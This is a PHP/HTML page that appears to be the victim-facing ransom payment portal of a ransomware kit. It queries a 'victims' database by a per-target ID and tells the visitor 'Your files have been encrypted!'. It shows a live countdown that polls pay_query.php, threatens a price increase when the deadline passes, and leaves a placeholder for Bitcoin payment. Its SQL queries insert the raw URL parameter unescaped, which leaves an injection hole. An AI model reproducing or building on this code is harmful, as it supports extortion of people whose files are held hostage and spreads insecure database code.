<html>
<head>
  <title>
    Decryption Check
  </title>
  <script src="/scripts/jquery.js"></script>

<?php

$servername = "localhost";
$username = "root";
$password = "";
$dbname = "victims";

// Create connection
$conn = new mysqli($servername, $username, $password, $dbname);

// Check connection
if ($conn->connect_error) {
    die("Connection failed: " . $conn->connect_error);
}

$getTargetID = $_GET['unique_id'];

$getCountdown = "";
$getExpTime = "";

if (isset($_GET['unique_id']) && !empty($_GET['unique_id'])) {
   $sql = "SELECT timediff(exp_time, curr_time) as time_left from target_list where unique_id = \"$getTargetID\"";
   $result = $conn->query($sql);

   if ($result->num_rows > 0) {
      while ($row = $result->fetch_assoc()) { 
         $getCountdown = $row[time_left];

         //if ($row['time_left'] > "00:00:01") {
            echo "<script>" . "\n";
            echo "   $(document).ready(function() {" . "\n";
            echo "     setInterval(function() {" . "\n";
            echo "       $.get(\"pay_query.php?unique_id=$getTargetID\", function (result) {" . "\n";
            echo "         $('#show_timer').html(result);" . "\n";
            echo "       });" . "\n";
            echo "     }, 1000);" . "\n";
            echo "  });" . "\n";
            echo "</script>" . "\n"; 
         //}
      }
   }

   $sql1 = "SELECT * FROM target_list where unique_id = \"$getTargetID\"";
   $result1 = $conn->query($sql1);

   if ($result1->num_rows > 0) {
      while ($row1 = $result1->fetch_assoc()) {
         $getExpTime = $row1[exp_time];
      }
   }
}
?>

<body bgcolor="lightblue">
  <center>
  <?php if ($getCountdown > "00:00:01") { ?>
  <table style="background: white;border-radius:10px;-moz-border-radius:10px;-webkit-border-radius:10px;">
    <tr>
      <td align="center">
       <b>Your files have been encrypted!</b>
      </td>
    </tr>
    <tr>
      <td align="center">
        To get the private key and the download script, you must submit your payment before the timer ends.
      </td>
    </tr>
    <tr>
      <td align="center">
        You must submit your payment before 
        <font size="5">
          <b><?php echo $getExpTime; ?></b>
        </font> or the price will increase!
      </td>
    </tr>
    <tr>
      <td align="center">
        Your time expires in
      </td>
    </tr>
    <tr>
      <td align="center">
        <div id="show_timer">
          <font size="5">
            <b><?php echo $getCountdown ?></b>
          </font>
        </div>
      </td>
    </tr>
  </table>

  <br /><br />
  
  <?php } else { ?>
    <table style="background: white;border-radius:10px;-moz-border-radius:10px;-webkit-border-radius:10px;">
    <tr>
      <td align="center">
        <b>Your files have been encrypted!</b>
      </td>
    </tr>
    <tr>
      <td align="center">
        <font color="red">
          Your time has expired and the price has increased!
        </font>
      </td>
    </tr>
    <tr>
      <td align="center">
        To get the private key and the decryption script, you must submit your paymentat the higher rate!
      </td>
    </tr>
    <tr>
      <td align="center">
        Your time is
        <font size="5">
          <div id="show_timer">
            <!--<b><?php echo $getCountdown ?></b>-->
          </div>
        </font>
        overdue!
      </td>
    </tr>
  </table>
  <?php } ?>
  </center>
  <!-- Bitcoin stuff goes here-->
</body>
</html>

<?php

$conn->close();

?>
